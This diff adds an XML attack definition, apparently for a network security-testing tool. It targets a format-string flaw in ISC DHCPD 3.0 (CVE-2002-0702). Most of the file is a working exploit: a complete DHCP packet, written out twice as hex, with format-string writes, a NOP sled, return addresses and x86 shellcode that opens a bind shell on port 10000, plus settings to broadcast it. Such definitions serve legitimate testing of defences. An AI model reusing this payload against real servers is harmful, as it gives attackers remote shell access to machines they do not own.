@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="DHCP NSUPDATE Format String Attack (hoagie)"/>
+    <EngDesc display="true" value="This threat sends out a DHCP discover message with the NSUPDATE feature set.  This code can cause execution on some target machines."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Corruption"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="DHCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Internet_Systems_Consortium"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Internet_Systems_Consortium_DHCPD"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Internet_Systems_Consortium_DHCPD_3.0"/>
+      <item value="Internet_Systems_Consortium_DHCPD_3.0.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/4701"/>
+    <CVEID display="true" value="CVE-2002-0702"/>
+    <bugtraqID display="true" value="4701"/>
+    <OSVDB display="true" value="14433"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464d492a00a900fe009b00c978513bcb"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725879927500000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X01\X01\X06\X00\X33\X00\Xa7\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X0f\X20\X22\X8d\X42\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X63\X82\X53\X63\X35\X01\X01\X32\X04\X0a\X01\X01\X97\X51\Xff\X01\X00\X00\X34\X63\Xdd\Xff\Xbf\X70\Xdd\Xff\Xbf\X4d\Xdd\Xff\Xbf\X70\Xdd\Xff\Xbf\X4e\Xdd\Xff\Xbf\X70\Xdd\Xff\Xbf\X4f\Xdd\Xff\Xbf\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X25\X30\X38\X78\X90\X90\X90\X90\X70\Xdd\Xff\Xbf\X90\X90\X90\X90\X70\Xdd\Xff\Xbf\X90\X90\X90\X90\X70\Xdd\Xff\Xbf\X90\X90\X90\X90\X70\Xdd\Xff\Xbf\X25\X31\X30\X30\X75\X25\X6e\X25\X31\X36\X36\X75\X25\X6e\X25\X33\X33\X75\X25\X6e\X25\X31\X39\X32\X75\X25\X6e\X90\X90\X90\X90\X31\Xdb\Xf7\Xe3\Xb0\X66\X53\X43\X53\X43\X53\X89\Xe1\X4b\Xcd\X80\X89\Xc7\X52\X66\X68\X27\X10\X43\X66\X53\X89\Xe1\Xb0\X10\X50\X51\X57\X89\Xe1\Xb0\X66\Xcd\X80\Xb0\X66\Xb3\X04\Xcd\X80\X50\X50\X57\X89\Xe1\X43\Xb0\X66\Xcd\X80\X89\Xd9\X89\Xc3\Xb0\X3f\X49\Xcd\X80\X41\Xe2\Xf8\X51\X68\X6e\X2f\X73\X68\X68\X2f\X2f\X62\X69\X89\Xe3\X51\X53\X89\Xe1\Xb0\X0b\Xcd\X80\X37\X07\X01\X1c\X02\X03\X0f\X06\X0c\Xff"/>
+    <Created value="1139461957" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" destMac="FF:FF:FF:FF:FF:FF" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(0,FF)" Protocol="11" HeaderChecksum="" srcIP="0.0.0.0" destIP="255.255.255.255" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="68" destPort="$destPort" checksum="" length="" Payload="010106003300a7250000000000000000000000000000000000000000000f20228d42000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010132040a01019751ff0100003463ddffbf70ddffbf4dddffbf70ddffbf4eddffbf70ddffbf4fddffbf2530387825303878253038782530387825303878253038782530387825303878253038782530387825303878253038782530387825303878253038782530387825303878253038789090909070ddffbf9090909070ddffbf9090909070ddffbf9090909070ddffbf2531303075256e2531363675256e25333375256e2531393275256e9090909031dbf7e3b066534353435389e14bcd8089c7526668271043665389e1b01050515789e1b066cd80b066b304cd8050505789e143b066cd8089d989c3b03f49cd8041e2f851686e2f7368682f2f626989e3515389e1b00bcd803707011c02030f060cff"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
